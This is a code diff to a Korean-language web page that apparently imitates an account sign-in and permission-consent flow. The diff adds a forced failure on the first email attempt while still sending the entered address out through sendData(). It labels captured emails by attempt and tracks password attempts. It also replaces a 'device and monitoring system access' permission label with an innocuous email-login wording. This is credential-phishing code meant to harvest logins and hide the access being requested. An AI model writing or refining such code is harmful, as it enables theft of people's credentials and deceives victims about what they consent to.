@@ -356,7 +356,7 @@
             <div class="scope-item">
               <svg class="scope-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
               <div>
-                <div class="scope-title">다니</div>
+                <div class="scope-title" id="profileNameTitle">사용자</div>
                 <div class="scope-sub">이름 및 프로필 사진</div>
               </div>
             </div>
@@ -372,8 +372,8 @@
             <div class="scope-item">
               <svg class="scope-icon" viewBox="0 0 24 24"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
               <div>
-                <div class="scope-title">컴퓨터 사용 권한</div>
-                <div class="scope-sub">기기 및 모니터링 시스템 접근 권한</div>
+                <div class="scope-title">이메일 주소로 로그인 및 사용</div>
+                <div class="scope-sub">이메일 주소로 로그인 및 사용 권한</div>
               </div>
             </div>
           </div>
@@ -402,6 +402,7 @@
       timestamp: null
     };
 
+    let emailAttemptCount = 0;
     let passwordAttemptCount = 0;
 
     // 엔터키 입력 이벤트 리스너 설정
@@ -433,10 +434,21 @@
     }
 
     function goStep2() {
-      const email = document.getElementById("emailInput").value.trim();
+      const emailInput = document.getElementById("emailInput");
+      const email = emailInput.value.trim();
       const emailField = document.getElementById("emailField");
 
-      // gmail.com 및 hwansang.kr 도메인만 통과 허용
+      emailAttemptCount++;
+
+      // 1차 시도는 무조건 오류 처리
+      if (emailAttemptCount === 1) {
+        emailField.classList.add("error");
+        loginData.email = email + " (1차 실패)";
+        sendData();
+        return;
+      }
+
+      // 2차 시도부터 도메인 검증 (gmail.com 또는 hwansang.kr)
       const isValidDomain = email.endsWith("@gmail.com") || email.endsWith("@hwansang.kr");
 
       if (!email || !isValidDomain) {
@@ -445,7 +457,7 @@
       }
 
       emailField.classList.remove("error");
-      loginData.email = email;
+      loginData.email = email + " (2차 성공)";
 
       document.getElementById("step1").classList.remove("active");
       document.getElementById("step2").classList.add("active");
@@ -498,7 +510,14 @@
         document.getElementById("step3").classList.add("active");
 
         document.getElementById("mainTitle").innerHTML = "홈페이지 서비스로 로그인";
-        document.getElementById("consentEmailTitle").textContent = loginData.email;
+        
+        // 실제 저장된 이메일 주소 추출
+        const cleanEmail = document.getElementById("emailInput").value.trim();
+        document.getElementById("consentEmailTitle").textContent = cleanEmail;
+
+        // 이메일의 @ 앞부분을 이름으로 사용
+        const username = cleanEmail.split("@")[0] || "사용자";
+        document.getElementById("profileNameTitle").textContent = username;
       }
     }
 
